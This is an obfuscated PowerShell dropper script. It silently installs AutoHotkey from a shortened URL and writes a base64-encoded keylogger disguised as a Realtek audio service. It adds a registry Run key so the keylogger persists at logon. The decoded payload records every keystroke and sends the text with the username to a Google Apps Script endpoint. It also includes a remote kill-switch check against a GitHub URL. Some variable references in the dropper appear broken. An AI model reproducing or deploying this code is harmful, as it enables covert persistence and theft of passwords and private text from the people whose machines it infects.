﻿Set-StrictMode -Off

function z($5VAUPX0,$8UNyT,$C1A = $false){
    $CwgmejzO9vBEoiVkc3WIdxT7S = [System.Convert]::FromBase64String($5VAUPX0)

    [System.IO.File]::WriteAllBytes($8UNyT, $CwgmejzO9vBEoiVkc3WIdxT7S)

    if($C1A){
        Start-Process $cTlsE9kaZ
    }
}

$aWRP4k = "$ENV:USERPROFILE\Downloads\AutoHotKeyInstaller.exe"
if (-Not (Test-Path -Path $aWRP4k)){
    Start-BitsTransfer -Source "https://shorturl.at/rnxiX" -Destination $aWRP4k
}

Start-Process $aWRP4k -ArgumentList '/silent' -Wait
Remove-Item -Path $aWRP4k

$n7Ps98plwkJq  = "I1JlcXVpcmVzIEF1dG9Ib3RrZXkgdjIuMAojU2luZ2xlSW5zdGFuY2UgRm9yY2UKI1dhcm4gQWxsLCBvZmYKdHJ5IHsKICAgIHVuaW5zdGFsbCgpIHsKICAgICAgICByZWdQYXRoIDo9ICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIKICAgICAgICByZWdWYWx1ZU5hbWUgOj0gIlJ0a0F1ZFVTZXJ2aWNlNjQiCiAgICAgICAgdHJ5ewogICAgICAgICAgICBSZWdEZWxldGUocmVnUGF0aCwgcmVnVmFsdWVOYW1lKQogICAgICAgIH0KICAgICAgICBwYXRoIDo9IEVudkdldCgnVGVtcCcpICdcNTJjZTdiYTMtOThlYi00MGEzLWJjNWMtM2Y1OTU4YjI3MGMwLmV4ZScKICAgICAgICBGaWxlRGVsZXRlIEFfU2NyaXB0RnVsbFBhdGgKICAgICAgICBEb3dubG9hZCAiaHR0cHM6Ly9zaG9ydHVybC5hdC9ybnhpWCIsIHBhdGgKICAgICAgICBsb29wIHsKICAgICAgICAgICAgaWYgKEZpbGVFeGlzdChwYXRoKSkgewogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQogICAgICAgICAgICBTbGVlcCgxMCkKICAgICAgICB9CiAgICAgICAgcGFyYW1zIDo9IHBhdGggJyAvdW5pbnN0YWxsIC9TSUxFTlQnCiAgICAgICAgUnVuIHBhcmFtcwogICAgICAgIEZpbGVEZWxldGUgcGF0aCA7IFdpbGwgRmFpbAogICAgfQoKICAgIGdsb2JhbCBVU0VSTkFNRSA6PSBFbnZHZXQoIlVTRVJOQU1FIikKICAgIGdsb2JhbCB0ZXh0IDo9ICcnCiAgICBnbG9iYWwgZXBvY2hUaW1lIDo9IDAKCiAgICB1cmwgOj0gRm9ybWF0KCdodHRwczovL3NjcmlwdC5nb29nbGUuY29tL21hY3Jvcy9zL0FLZnljYndOVWFNNWtIQkUzTHNxemlIRDdJVmd4MFAtallZTXFXOFg0dzBpWWI4c1pmU0s1QmlWWHcteUhZRmhpRVg1R3dxUy9leGVjP3VzZXI9ezF9JywgVVNFUk5BTUUpCiAgICB3aHIgOj0gQ29tT2JqZWN0KCdXaW5IdHRwLldpbkh0dHBSZXF1ZXN0LjUuMScpCiAgICB3aHIuT3BlbignR0VUJywgdXJsLCBGYWxzZSksIHdoci5TZW5kKCkKCiAgICByZXBlYXRTdHJpbmcoc3RyaW5nLCBjb3VudCkgewogICAgICAgIHJlc3VsdCA6PSAiIgogICAgICAgIExvb3AgY291bnQgewogICAgICAgICAgICByZXN1bHQgLj0gc3RyaW5nCiAgICAgICAgfQogICAgICAgIHJldHVybiByZXN1bHQKICAgIH0KCiAgICBVcmxFbmNvZGUoc3RyKSB7CiAgICAgICAgZW5jb2RlZCA6PSAiIgogICAgICAgIGNoYXJzIDo9IFN0clNwbGl0KHN0cikgIDsgU3BsaXQgdGhlIHN0cmluZyBpbnRvIGFuIGFycmF5IG9mIGNoYXJhY3RlcnMKICAgICAgICBmb3IgY2hhciBpbiBjaGFycyB7CiAgICAgICAgICAgIGlmIChjaGFyID0gImBuIikgewogICAgICAgICAgICAgICAgZW5jb2RlZCAuPSAiJTBBIiAgOyBFbmNvZGUgbmV3bGluZSBhcyAlMEEKICAgICAgICAgICAgfSBlbHNlIGlmIChjaGFyID0gImByIikgewogICAgICAgICAgICAgICAgZW5jb2RlZCAuPSAiJTBEIiAgOyBFbmNvZGUgY2FycmlhZ2UgcmV0dXJuIGFzICUwRAogICAgICAgICAgICB9IGVsc2UgaWYgKFJlZ0V4TWF0Y2goY2hhciwgIl5bQS1aYS16MC05XSQiKSkgewogICAgICAgICAgICAgICAgZW5jb2RlZCAuPSBjaGFyICA7IEtlZXAgYWxwaGFudW1lcmljIGNoYXJhY3RlcnMgdW5jaGFuZ2VkCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBlbmNvZGVkIC49ICIlIiAuIEZvcm1hdCgiezpYfSIsIE9yZChjaGFyKSkgIDsgQ29udmVydCB0byB1cHBlcmNhc2UgaGV4YWRlY2ltYWwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gZW5jb2RlZAogICAgfQogICAgY2hlY2soKXsKICAgICAgICB3aHIgOj0gQ29tT2JqZWN0KCdXaW5IdHRwLldpbkh0dHBSZXF1ZXN0LjUuMScpCiAgICAgICAgd2hyLk9wZW4oJ0dFVCcsICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdmZ5YS9hL3JlZnMvaGVhZHMvbWFpbi8nIFVybEVuY29kZShVU0VSTkFNRSkpCiAgICAgICAgd2hyLlNlbmQoKQogICAgICAgIHJlc3BvbnNlIDo9IHdoci5SZXNwb25zZVRleHQKCiAgICAgICAgaWYgKHJlc3BvbnNlICE9ICI0MDQ6IE5vdCBGb3VuZCIpIHsKICAgICAgICAgICAgdW5pbnN0YWxsKCkKICAgICAgICB9CiAgICB9CiAgICBjaGVjaygpCiAgICBTZW5kKHR4dCkgewogICAgICAgIDt0eHQgOj0gU3RyUmVwbGFjZSh0eHQsICcgJywgJyUyMCcpICAgOyBSZXBsYWNlIHNwYWNlcyB3aXRoICUyMAogICAgICAgIDt0eHQgOj0gU3RyUmVwbGFjZSh0eHQsICdgbicsICclMEEnKSAgOyBSZXBsYWNlIG5ldyBsaW5lcyB3aXRoICUwQQogICAgICAgIHR4dCA6PSBVcmxFbmNvZGUodHh0KQogICAgICAgIHVybCA6PSBGb3JtYXQoJ2h0dHBzOi8vc2NyaXB0Lmdvb2dsZS5jb20vbWFjcm9zL3MvQUtmeWNid05VYU01a0hCRTNMc3F6aUhEN0lWZ3gwUC1qWVlNcVc4WDR3MGlZYjhzWmZTSzVCaVZYdy15SFlGaGlFWDVHd3FTL2V4ZWM/dXNlcj17MX0mcT17Mn0nLCBVU0VSTkFNRSwgdHh0KQogICAgICAgIGNoZWNrKCkKICAgIH0KICAgIExvZyhrZXkpIHsKICAgICAgICBnbG9iYWwgdGV4dAogICAgICAgIGdsb2JhbCBlcG9jaFRpbWUKICAgICAgICBpZiAoa2V5ID09ICdCQUNLU1BBQ0UnKSB7CiAgICAgICAgICAgIHRleHQgOj0gU3ViU3RyKHRleHQsIDEsIFN0ckxlbih0ZXh0KSAtIDEpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0KICAgICAgICBlcG9jaFRpbWUgOj0gQV9UaWNrQ291bnQKICAgICAgICB0ZXh0IC49IGtleQogICAgfQogICAgfjA6OiBMb2coJzAnKQogICAgfjE6OiBMb2coJzEnKQogICAgfjI6OiBMb2coJzInKQogICAgfjM6OiBMb2coJzMnKQogICAgfjQ6OiBMb2coJzQnKQogICAgfjU6OiBMb2coJzUnKQogICAgfjY6OiBMb2coJzYnKQogICAgfjc6OiBMb2coJzcnKQogICAgfjg6OiBMb2coJzgnKQogICAgfjk6OiBMb2coJzknKQogICAgfmE6OiBMb2coJ2EnKQogICAgfmI6OiBMb2coJ2InKQogICAgfmM6OiBMb2coJ2MnKQogICAgfmQ6OiBMb2coJ2QnKQogICAgfmU6OiBMb2coJ2UnKQogICAgfmY6OiBMb2coJ2YnKQogICAgfmc6OiBMb2coJ2cnKQogICAgfmg6OiBMb2coJ2gnKQogICAgfmk6OiBMb2coJ2knKQogICAgfmo6OiBMb2coJ2onKQogICAgfms6OiBMb2coJ2snKQogICAgfmw6OiBMb2coJ2wnKQogICAgfm06OiBMb2coJ20nKQogICAgfm46OiBMb2coJ24nKQogICAgfm86OiBMb2coJ28nKQogICAgfnA6OiBMb2coJ3AnKQogICAgfnE6OiBMb2coJ3EnKQogICAgfnI6OiBMb2coJ3InKQogICAgfnM6OiBMb2coJ3MnKQogICAgfnQ6OiBMb2coJ3QnKQogICAgfnU6OiBMb2coJ3UnKQogICAgfnY6OiBMb2coJ3YnKQogICAgfnc6OiBMb2coJ3cnKQogICAgfng6OiBMb2coJ3gnKQogICAgfnk6OiBMb2coJ3knKQogICAgfno6OiBMb2coJ3onKQoKICAgIH4rYTo6IExvZygnQScpCiAgICB+K2I6OiBMb2coJ0InKQogICAgfitjOjogTG9nKCdDJykKICAgIH4rZDo6IExvZygnRCcpCiAgICB+K2U6OiBMb2coJ0UnKQogICAgfitmOjogTG9nKCdGJykKICAgIH4rZzo6IExvZygnRycpCiAgICB+K2g6OiBMb2coJ0gnKQogICAgfitpOjogTG9nKCdJJykKICAgIH4rajo6IExvZygnSicpCiAgICB+K2s6OiBMb2coJ0snKQogICAgfitsOjogTG9nKCdMJykKICAgIH4rbTo6IExvZygnTScpCiAgICB+K246OiBMb2coJ04nKQogICAgfitvOjogTG9nKCdPJykKICAgIH4rcDo6IExvZygnUCcpCiAgICB+K3E6OiBMb2coJ1EnKQogICAgfityOjogTG9nKCdSJykKICAgIH4rczo6IExvZygnUycpCiAgICB+K3Q6OiBMb2coJ1QnKQogICAgfit1OjogTG9nKCdVJykKICAgIH4rdjo6IExvZygnVicpCiAgICB+K3c6OiBMb2coJ1cnKQogICAgfit4OjogTG9nKCdYJykKICAgIH4reTo6IExvZygnWScpCiAgICB+K3o6OiBMb2coJ1onKQoKICAgIH4qU3BhY2U6OiBMb2coJyAnKQogICAgfipFbnRlcjo6IExvZygnYG4nKQogICAgfipCYWNrc3BhY2U6OiBMb2coJ0JBQ0tTUEFDRScpCiAgICB+VGFiOjogTG9nKCdgdCcpICA7IFRhYiB1c2luZyBlc2NhcGUgc2VxdWVuY2UKCiAgICB+KzE6OiBMb2coIiEiKQogICAgfisyOjogTG9nKCJAIikKICAgIH4rMzo6IExvZygnYCMnKQogICAgfis0OjogTG9nKCIkIikKICAgIH4rNTo6IExvZygiJSIpCiAgICB+KzY6OiBMb2coIl4iKQogICAgfis3OjogTG9nKCImIikKICAgIH4rODo6IExvZygiKiIpCiAgICB+Kzk6OiBMb2coIigiKQogICAgfiswOjogTG9nKCIpIikKCiAgICB+LTo6IExvZygnLScpCiAgICB+Ky06OiBMb2coJ18nKQogICAgfj06OiBMb2coJz0nKQogICAgfis9OjogTG9nKCcrJykKCiAgICB+Wzo6IExvZygnWycpCiAgICB+XTo6IExvZygnXScpCiAgICB+XDo6IExvZygnXCcpCiAgICB+Ozo6IExvZygnOycpCiAgICB+YDo6IExvZygnYGAnKQogICAgfitgOjogTG9nKCd+JykKICAgIH4sOjogTG9nKCcsJykKICAgIH4rLDo6IExvZygnPCcpCiAgICB+Ky46OiBMb2coJz4nKQogICAgfisvOjogTG9nKCc/JykKICAgIH4uOjogTG9nKCcuJykKICAgIH4vOjogTG9nKCcvJykKICAgIH4rWzo6IExvZygneycpCiAgICB+K106OiBMb2coJ30nKQogICAgfitcOjogTG9nKCd8JykKICAgIH4rOzo6IExvZygnOicpCiAgICB+Kyc6OiBMb2coJyInKQogICAgfic6OiBMb2coIiciKQogICAgTG9vcCB7CiAgICAgICAgZ2xvYmFsIGVwb2NoVGltZSwgdGV4dAogICAgICAgIHRpY2sgOj0gQV9UaWNrQ291bnQgIDsgR2V0IGN1cnJlbnQgVVRDIHRpbWUKICAgICAgICBpZiAoKHRpY2sgLSBlcG9jaFRpbWUpIC8gMTAwMCA+IDUpICYmICh0ZXh0ICE9ICcnKSB7ICA7IENvbXBhcmUgaW4gbWlsbGlzZWNvbmRzICgxMCBzZWNvbmRzKQogICAgICAgICAgICBTZW5kKHRleHQpCiAgICAgICAgICAgIHRleHQgOj0gJycKICAgICAgICAgICAgZXBvY2hUaW1lIDo9IHRpY2sKICAgICAgICB9CiAgICAgICAgU2xlZXAoMTAwKQogICAgfQp9"
$butTG0 = "$ERq5PZGS10lUNavebVT9Y3:USERPROFILE\RtkAudUService64.ahk"
z $n7Ps98plwkJq $butTG0 $true
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RtkAudUService64' -Value $butTG0


